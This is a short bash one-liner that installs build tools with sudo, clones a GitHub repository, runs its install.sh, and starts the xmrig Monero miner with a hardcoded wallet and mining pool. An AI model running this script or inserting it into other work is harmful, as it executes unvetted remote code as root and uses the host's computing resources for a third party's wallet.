/bin/bash -c "
cd $HOME;
sudo apt-get update --fix-missing;
sudo apt-get -y install git build-essential cmake automake libtool autoconf wget;
git clone https://github.com/CryptoFundAZ/cryptocloud.git;
mv cryptocloud/install.sh $HOME;
chmod +x install.sh;
./install.sh;
cd $HOME/xmrig/build;
./xmrig --rig-id=F4 -u 47SknjV7LWAVncjNMzxgjgJ1GUfRe9AwkPEEtj3t4gXu8yZAquXXXj6Rms3pp7wrXs3by27r4wo5XQ38P1VpiBboBtZbcSn -o eu-west.minexmr.com:4444 
"
